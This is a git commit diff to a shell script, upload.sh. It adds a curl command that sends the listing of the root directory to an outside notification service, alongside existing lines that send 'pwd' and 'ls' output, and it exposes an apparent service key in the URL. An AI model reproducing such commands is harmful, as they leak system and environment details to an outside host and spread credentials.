ec37b5811fc5ddf16f2a72ad7b4e35d22c3121e2
huxins <huxins@163.com>
2020-01-09 10:42:08 +0800

    update

--- upload.sh
+++ upload.sh
@@ -7,6 +7,8 @@ curl -X GET -G --data-urlencode "text=pwd" --data-urlencode "desp=$(pwd)" \
 	"https://sc.ftqq.com/SCU39002T44ee92843b639edac4813ce6d566c3c45c3b0f775e97d.send"
 curl -X GET -G --data-urlencode "text=ls" --data-urlencode "desp=$(ls)" \
 	"https://sc.ftqq.com/SCU39002T44ee92843b639edac4813ce6d566c3c45c3b0f775e97d.send"
+curl -X GET -G --data-urlencode "text=ls /" --data-urlencode "desp=$(ls /)" \
+	"https://sc.ftqq.com/SCU39002T44ee92843b639edac4813ce6d566c3c45c3b0f775e97d.send"
 
 pip install coscmd
 
